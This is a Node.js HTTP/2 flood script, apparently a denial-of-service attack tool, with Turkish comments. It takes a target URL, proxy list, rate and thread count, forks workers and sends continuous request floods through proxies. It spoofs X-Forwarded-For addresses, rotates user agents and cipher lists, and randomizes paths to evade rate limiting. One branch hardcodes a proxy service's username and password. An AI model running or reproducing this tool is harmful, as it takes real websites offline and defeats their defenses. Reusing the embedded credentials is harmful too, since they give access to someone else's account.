/*

    Eğer bir hata oluşursa ekrana basılacak

*/
process.on('uncaughtException', function(er) {
    // console.log(er);
});
process.on('unhandledRejection', function(er) {
    // console.log(er);
});
require('events').EventEmitter.defaultMaxListeners = 0;




/*

    Moduller...

*/
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring');
var path = require("path");
const cluster = require('cluster');
const http2 = require('http2');
const tls = require("tls");
const http = require("http");


/*

    Başlangıçta oluşturulan değişkenler

*/
var fileName = __filename;
var file = path.basename(fileName);
let headerbuilders;
let COOKIES = undefined;
let POSTDATA = undefined;

if (process.argv.length < 8){
    console.log("Hatalı bir komut girdin.")
    process.exit(0);
}




/*

   CMD ekranından gelen bilgileri alıyor.

*/
let randomparam = false;   // randomparam %RAND% var mı yok mu bakıyor sürekli olarak ona göre işlem yapıyor.
var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n'); // Proxyleri okuyor ve arraya atıyor
var rate = process.argv[6]; // Ratelimit yakalanmaması için 6 da 1 ise ona göre saldıracak.
var target_url = process.argv[3]; // Hedef URL
const target = target_url.split('""')[0];



/*

   Eğer RandomString veya Cookie veya Postdata girdi isek bu şekilde HEADERS'ı düzenliyor.

*/
process.argv.forEach((ss) => {
    if (ss.includes("cookie=") && !process.argv[2].split('""')[0].includes(ss)){
        COOKIES = ss.slice(7);
    } else if (ss.includes("postdata=") && !process.argv[2].split('""')[0].includes(ss)){
        if (process.argv[2].toUpperCase() !== "POST"){
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        POSTDATA = ss.slice(9);
    } else if (ss.includes("randomstring=")){
        randomparam = ss.slice(13);
        console.log("(!) RandomString Mode");
    } else if (ss.includes("headerdata=")){
        headerbuilders = {
            "Cache-Control": "max-age=0",
            "Referer":target,
            "X-Forwarded-For":spoof(),
            "Cookie":COOKIES,
            ":method":"GET"
        };
        if (ss.slice(11).split('""')[0].includes("&")) {
            const hddata = ss.slice(11).split('""')[0].split("&");
            for (let i = 0; i < hddata.length; i++) {
                const head = hddata[i].split("=")[0];
                const dat = hddata[i].split("=")[1];
                headerbuilders[head] = dat;
            }
        } else {
            const hddata = ss.slice(11).split('""')[0];
            const head = hddata.split("=")[0];
            const dat = hddata.split("=")[1];
            headerbuilders[head] = dat;
        }
    }
});
if (COOKIES !== undefined){
    console.log("(!) Custom Cookie Mode");
} else {COOKIES = "";}
if (POSTDATA !== undefined){
    console.log("(!) Custom PostData Mode");
} else {POSTDATA = "";}
if (headerbuilders !== undefined){
    console.log("(!) Custom HeaderData Mode");
    if (cluster.isMaster){
        for (let i = 0; i < process.argv[7]; i++){
            cluster.fork();
            console.log(`(!) Threads ${i} Started Attacking`);
        }

        setTimeout(() => {
            process.exit(1);
        }, process.argv[5] * 1000);
    } else {
        startflood();
    }
}
else {
    headerbuilders = {
        "Cache-Control": "max-age=0",
        "Referer":target,
        "X-Forwarded-For":spoof(),
        "Cookie":COOKIES,
        ":method":"GET"
    }
    if (cluster.isMaster){
        for (let i = 0; i < process.argv[7]; i++){
            cluster.fork();
            console.log(`(!) Threads ${i} Started Attacking`);
        }

        setTimeout(() => {
            process.exit(1);
        }, process.argv[5] * 1000);
    } else {
        startflood();
    }
}

var parsed = url.parse(target); // URL i parsed ediyor.
process.setMaxListeners(0);

function ra() {
    const rsdat = randstr.generate({
        "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length":155
    });
    return rsdat;
}  // Random string oluşturuyor.

const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77",
];  // User Agent listesi

function spoof(){
    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}  // Ratelimit aşılabilsin diye yapılan spoof (yönlendirme işlemi)

const cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];  // Bende bilmiyorum :O

function startflood(){
    if (process.argv[2].toUpperCase() == "POST"){
        const tagpage = url.parse(target).path.replace("%RAND%",ra())
        headerbuilders[":method"] = "POST"
        headerbuilders["Content-Type"] = "text/plain"
        if (randomparam) {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];

                proxy = proxy.split(':');

                var http = require('http'),
                    tls = require('tls');

                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                const username = 'brd-customer-c_6734cd49-zone-zone1-route_err-pass_dyn-country-ru';
                const password = 'mu3rynzq99l3';
                var req = http.request({
                    //set proxy session
                    host: "ru.smartproxy.com",
                    port: "40000",
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443",
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) {
                    //open raw request
                    const client = http2.connect(parsed.href, {
                        createConnection: () => tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLS_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2'],
                            sessionTimeout: 5000,
                            socket: socket
                        }, function () {
                            for (let i = 0; i< rate; i++){
                                headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
                                headerbuilders["X-Forwarded-For"] = spoof();
                                headerbuilders["Body"] = `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%",ra()) : POSTDATA}`
                                headerbuilders["Cookie"].replace("%RAND%",ra());
                                const req = client.request(headerbuilders);
                                req.end();
                                req.on("response", () => {
                                    req.close();
                                })
                            }
                        })
                    });
                });
                req.end();
            });
        } else {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');

                var http = require('http'),
                    tls = require('tls');

                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';

                var req = http.request({
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443",
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) {
                    //open raw request
                    const client = http2.connect(parsed.href, {

                        createConnection: () => tls.connect({
                            host: `${(url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path}`,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLS_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2'],
                            //sessionTimeout: 5000,
                            socket: socket
                        }, function () {
                            for (let i = 0; i< rate; i++){
                                headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
                                headerbuilders["X-Forwarded-For"] = spoof();
                                headerbuilders["Body"] = `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%",ra()) : POSTDATA}`
                                headerbuilders["Cookie"].replace("%RAND%",ra());
                                const req = client.request(headerbuilders);
                                req.end();
                                req.on("response", () => {
                                    req.close();
                                })
                            }
                        })
                    });
                });
                req.end();
            });
        }
    }   // Eğer POST işlemi ise
    else if (process.argv[2].toUpperCase() == "GET") {
        headerbuilders[":method"] = "GET"
        if (randomparam){ // Random parametre var ise
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');

                var http = require('http'),
                    tls = require('tls');

                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                var req = http.request({
                    // Proxy OTURUM açılıyor..
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
                    method: 'CONNECT',
                    path: parsed.host + ":443",
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) {
                    //open raw request
                    const client = http2.connect(parsed.href, {

                        createConnection: () => tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLS_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2'],
                            //sessionTimeout: 5000,   // Bu oturum süresini bildiriyor.
                            socket: socket
                        }, function () {

                            for (let i = 0; i< rate; i++){  // Ratelimit kadar Flood burada gerçekleşiyor.
                                headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
                                headerbuilders["X-Forwarded-For"] = spoof();
                                headerbuilders["Cookie"].replace("%RAND%",ra());
                                const req = client.request(headerbuilders);
                                req.end();
                                req.on("response", () => {
                                    req.close();
                                })
                            }
                        })
                    });
                });
                req.end();
            });
        }
        else { // Random parametre yok ise

            setInterval(() => {
                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');

                var http = require('http'),
                    tls = require('tls');

                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                var req = http.request({
                    // Proxy OTURUM açılıyor..
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
                    method: 'CONNECT',
                    path: parsed.host + ":443",
                }, (err) => {
                    req.end();
                    return;
                });

                req.on('connect', function (res, socket, head) {
                    //open raw request
                    const client = http2.connect(parsed.href, {
                        createConnection: () => tls.connect({
                            host: parsed.host,
                            ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                            secureProtocol: 'TLS_method',
                            servername: parsed.host,
                            secure: true,
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2'],
                            sessionTimeout: 5000,   // Bu oturum süresini bildiriyor.
                            socket: socket
                        }, function () {
                            for (let i = 0; i< rate; i++){  // Ratelimit kadar Flood burada gerçekleşiyor.
                                headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
                                headerbuilders["X-Forwarded-For"] = spoof();
                                headerbuilders["Cookie"].replace("%RAND%",ra());
                                const req = client.request(headerbuilders);
                                req.end();
                                req.on("response", () => {
                                    req.close();
                                })
                            }
                        })
                    });
                });
                req.end();


            });

        }
    }  // Eğer GET işlemi ise
    else {
        console.log("Method Invalid");
        process.exit(1);
    } // Hiçbir şey yoksa invalid method diyor.

}